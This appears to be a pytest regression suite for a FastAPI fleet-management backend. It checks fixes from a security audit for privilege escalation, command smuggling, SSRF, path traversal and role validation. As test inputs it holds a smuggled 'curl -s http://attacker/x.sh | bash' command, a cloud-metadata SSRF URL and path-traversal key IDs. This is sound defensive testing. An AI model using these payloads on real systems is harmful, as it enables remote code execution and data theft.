"""Security regression tests for the 2026-10 OWASP audit of the FastAPI backend.

Each test names the finding it locks in. Removing any guard here must fail CI.

Findings covered:
  C-1  VIEWER → arbitrary root command execution on managed hosts
       (fail-open capability RBAC + `command` parameter smuggled into a
       job type that is not gated on EXEC_BASH)
  M-1  the "ansible-automation" plugin kill-switch was bypassable via
       POST /api/v1/jobs
  M-2  OPERATOR could trigger PLUGIN_INSTALL (root code push to the fleet)
  M-7  job parameters leaked the shell `command` to every caller
  F-01 SSRF via the admin-controlled Slack webhook URL
  F-02 path traversal / file write outside the keys dir via `key_id`
  L-1  POST /admin/users forwarded an unvalidated role to the identity provider
"""

import uuid

import pytest
from httpx import AsyncClient

from lokilinux.auth.dependencies import get_current_user
from lokilinux.models.agent import Agent, AgentStatus
from lokilinux.models.plugin import Plugin
from lokilinux.services.job_service import JobService
from lokilinux.utils.capability_rbac import (
    assert_can_create,
    required_capabilities,
)

ANSIBLE_PLUGIN = "ansible-automation"


# ── helpers ───────────────────────────────────────────────────────────────────


async def _make_agent(db_session, **overrides) -> Agent:
    agent = Agent(
        agent_id=overrides.pop("agent_id", str(uuid.uuid4())),
        status=overrides.pop("status", AgentStatus.ACTIVE),
        hostname=overrides.pop("hostname", f"audit-{uuid.uuid4().hex[:8]}"),
        **overrides,
    )
    db_session.add(agent)
    await db_session.flush()
    return agent


async def _set_ansible_plugin(db_session, enabled: bool) -> None:
    from sqlalchemy import select

    plugin = (
        await db_session.execute(select(Plugin).where(Plugin.name == ANSIBLE_PLUGIN))
    ).scalar_one_or_none()
    if plugin is None:
        db_session.add(
            Plugin(
                name=ANSIBLE_PLUGIN,
                version="1.0.0",
                plugin_type="control-plane",
                is_enabled=enabled,
            )
        )
    else:
        plugin.is_enabled = enabled
    await db_session.commit()


@pytest.fixture
def as_role(client):
    # Same shape as tests/unit/test_storage_read_permission.py — conftest's
    # client fixture does not expose the app, so reach it through the transport.
    app = client._transport.app
    saved = app.dependency_overrides.get(get_current_user)

    def _set(role: str) -> dict:
        user = {"id": str(uuid.uuid4()), "role": role, "username": "t"}
        app.dependency_overrides[get_current_user] = lambda: user
        return user

    yield _set
    if saved is None:
        app.dependency_overrides.pop(get_current_user, None)
    else:
        app.dependency_overrides[get_current_user] = saved


# ── C-1: capability RBAC must fail closed ─────────────────────────────────────


def test_unmapped_job_type_is_not_free_for_everyone():
    """required_capabilities() used to return an empty set for a job_type it
    did not know, and unauthorized_capabilities() treats an empty set as
    'nothing denied' — so an unmapped job_type was creatable by VIEWER."""
    caps = required_capabilities("COMPLIANCE_IMPORT_CONTENT")
    assert caps, "an unmapped job_type must still demand a capability"
    with pytest.raises(PermissionError):
        assert_can_create("VIEWER", "COMPLIANCE_IMPORT_CONTENT")


def test_unknown_role_is_denied_every_capability():
    """The fail-closed path must not accidentally widen access."""
    with pytest.raises(PermissionError):
        assert_can_create("NOT_A_ROLE", "CVE_SCAN")


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "job_type,role",
    [
        ("CVE_SCAN", "VIEWER"),
        ("INVENTORY_SCAN", "VIEWER"),
        ("COMPLIANCE_IMPORT_CONTENT", "VIEWER"),
        ("SECURITY_PATCH", "OPERATOR"),
        ("REMEDIATION", "OPERATOR"),
        ("PACKAGE_UPDATE", "OPERATOR"),
    ],
)
async def test_a_command_parameter_cannot_be_smuggled(
    job_type, role, as_role, client: AsyncClient, db_session
):
    """The exploit: a job type that is not gated on EXEC_BASH, carrying a
    `command` parameter. The agent's generic dispatch branch runs
    params["command"] as root, so this was arbitrary root command execution
    for anyone who could create that job type."""
    agent = await _make_agent(db_session)
    await db_session.commit()
    as_role(role)

    resp = await client.post(
        "/api/v1/jobs",
        json={
            "name": "scan",
            "job_type": job_type,
            "target_servers": {"agent_ids": [str(agent.id)]},
            "parameters": {"command": "curl -s http://attacker/x.sh | bash"},
        },
    )
    assert resp.status_code == 403, resp.text


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "job_type",
    [
        "CVE_SCAN",
        "INVENTORY_SCAN",
        "SECURITY_PATCH",
        "REMEDIATION",
        "SERVICE",
        "FILE",
        "PACKAGE_UPDATE",
    ],
)
async def test_job_service_rejects_a_smuggled_command(
    job_type, client: AsyncClient, db_session, fake_cache
):
    """The router is not the only way in — policies, workflows and services
    call JobService.create_job directly. The guard must live at that
    chokepoint, not only in the router."""
    agent = await _make_agent(db_session)
    await db_session.commit()
    service = JobService(db_session, fake_cache)
    with pytest.raises(PermissionError):
        await service.create_job(
            name="policy-driven scan",
            job_type=job_type,
            target_servers={"agent_ids": [str(agent.id)]},
            parameters={"command": "id"},
        )


@pytest.mark.asyncio
async def test_admin_can_still_create_a_custom_command_job(
    as_role, client: AsyncClient, db_session
):
    """The legitimate shell path must keep working — CUSTOM_COMMAND is the
    one job type whose execution IS the `command` parameter."""
    agent = await _make_agent(db_session)
    await db_session.commit()
    as_role("ADMIN")

    resp = await client.post(
        "/api/v1/jobs",
        json={
            "name": "legit command",
            "job_type": "CUSTOM_COMMAND",
            "target_servers": {"agent_ids": [str(agent.id)]},
            "parameters": {"command": "true"},
        },
    )
    assert resp.status_code == 201, resp.text
    assert resp.json()["job_type"] == "CUSTOM_COMMAND"


@pytest.mark.asyncio
async def test_workflow_step_params_are_not_rejected(client: AsyncClient, db_session, fake_cache):
    """WORKFLOW_STEPS carries its shell lines under `steps`, not `command` —
    the guard must not break the workflow engine."""
    agent = await _make_agent(db_session)
    await db_session.commit()
    service = JobService(db_session, fake_cache)
    job = await service.create_job(
        name="workflow step",
        job_type="WORKFLOW_STEPS",
        target_servers={"agent_ids": [str(agent.id)]},
        parameters={"steps": [{"type": "command", "config": {"command": "true"}}]},
    )
    assert job.job_type == "WORKFLOW_STEPS"


# ── M-1: the ansible plugin kill-switch must cover POST /jobs ─────────────────


@pytest.mark.asyncio
async def test_ansible_playbook_job_is_refused_when_the_plugin_is_disabled(
    as_role, client: AsyncClient, db_session
):
    await _set_ansible_plugin(db_session, False)
    agent = await _make_agent(db_session)
    await db_session.commit()
    as_role("ADMIN")

    resp = await client.post(
        "/api/v1/jobs",
        json={
            "name": "playbook",
            "job_type": "ANSIBLE_PLAYBOOK",
            "target_servers": {"agent_ids": [str(agent.id)]},
            "parameters": {"playbook_content": "- hosts: all\n  tasks: []\n"},
        },
    )
    assert resp.status_code == 403, resp.text
    assert "not enabled" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_ansible_playbook_job_still_works_when_the_plugin_is_enabled(
    as_role, client: AsyncClient, db_session
):
    await _set_ansible_plugin(db_session, True)
    agent = await _make_agent(db_session)
    await db_session.commit()
    as_role("ADMIN")

    resp = await client.post(
        "/api/v1/jobs",
        json={
            "name": "playbook",
            "job_type": "ANSIBLE_PLAYBOOK",
            "target_servers": {"agent_ids": [str(agent.id)]},
            "parameters": {"playbook_content": "- hosts: all\n  tasks: []\n"},
        },
    )
    assert resp.status_code == 201, resp.text


# ── M-7: job parameters must not leak the shell command ───────────────────────


@pytest.mark.asyncio
async def test_viewer_cannot_read_the_shell_command_of_a_job(
    as_role, client: AsyncClient, db_session
):
    agent = await _make_agent(db_session)
    await db_session.commit()
    as_role("ADMIN")
    created = await client.post(
        "/api/v1/jobs",
        json={
            "name": "cmd",
            "job_type": "CUSTOM_COMMAND",
            "target_servers": {"agent_ids": [str(agent.id)]},
            "parameters": {"command": "psql $DATABASE_URL -c 'select 1'"},
        },
    )
    assert created.status_code == 201, created.text
    job_id = created.json()["id"]

    as_role("VIEWER")
    listed = await client.get("/api/v1/jobs")
    assert listed.status_code == 200
    for item in listed.json()["items"]:
        assert "command" not in (item.get("parameters") or {})

    detail = await client.get(f"/api/v1/jobs/{job_id}")
    assert detail.status_code == 200
    assert "command" not in (detail.json().get("parameters") or {})


# ── M-2: plugin install is ADMIN-only (matches the capability table) ──────────


@pytest.mark.asyncio
async def test_operator_cannot_install_a_plugin(as_role, client: AsyncClient, db_session):
    agent = await _make_agent(db_session)
    await db_session.commit()
    as_role("OPERATOR")

    resp = await client.post(
        f"/api/v1/plugins/{uuid.uuid4()}/install",
        params={"agent_ids": str(agent.id)},
    )
    assert resp.status_code == 403, resp.text


# ── F-01: the Slack webhook URL must go through the SSRF guard ────────────────


@pytest.mark.asyncio
async def test_slack_webhook_to_an_internal_address_is_refused(monkeypatch):
    from lokilinux.workers import notification_worker as nw

    posted = []

    class _Client:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def post(self, *a, **k):
            posted.append(a)
            raise AssertionError("an internal webhook URL must never be requested")

    monkeypatch.setattr(nw.httpx, "AsyncClient", _Client)

    worker = nw.NotificationWorker(nats_client=None, db_session_factory=None)
    await worker._send_slack("http://169.254.169.254/latest/meta-data/", "subj", "body")
    assert not posted


# ── F-02: key_id must not escape the keys directory ───────────────────────────


def test_key_manager_rejects_a_traversing_key_id(tmp_path):
    from lokilinux.kms import KeyManager

    for bad in ("..", "../escape", "a/b", "", ".", "x" * 65):
        with pytest.raises(ValueError):
            KeyManager(str(tmp_path), bad)


@pytest.mark.asyncio
async def test_kms_key_id_traversal_is_refused(client: AsyncClient, tmp_path, monkeypatch):
    keys_dir = tmp_path / "keys"
    monkeypatch.setenv("LOKILINUX_KEYS_DIR", str(keys_dir))

    # ".." decodes to a single path segment, so it reaches the route and must
    # be refused by the key_id pattern (422) rather than reaching the disk.
    resp = await client.post("/api/v1/admin/kms/keys/%2e%2e/versions")
    assert resp.status_code in (400, 422), resp.text

    # A slash inside the id never matches the single-segment route at all.
    resp = await client.post("/api/v1/admin/kms/keys/%2e%2e%2fescape/versions")
    assert resp.status_code in (400, 404, 422), resp.text

    # Nothing was written above the keys directory.
    assert not (tmp_path / "escape").exists()
    assert not (tmp_path / "v1.key").exists()


# ── L-1: an unvalidated role must not reach the identity provider ─────────────


@pytest.mark.asyncio
async def test_create_user_rejects_an_unknown_role(client: AsyncClient):
    resp = await client.post(
        "/api/v1/admin/users",
        json={
            "email": "x@example.com",
            "username": "x",
            "password": "hunter2hunter2",
            "role": "SUPERADMIN",
        },
    )
    assert resp.status_code == 400, resp.text
    assert "Invalid role" in resp.json()["detail"]
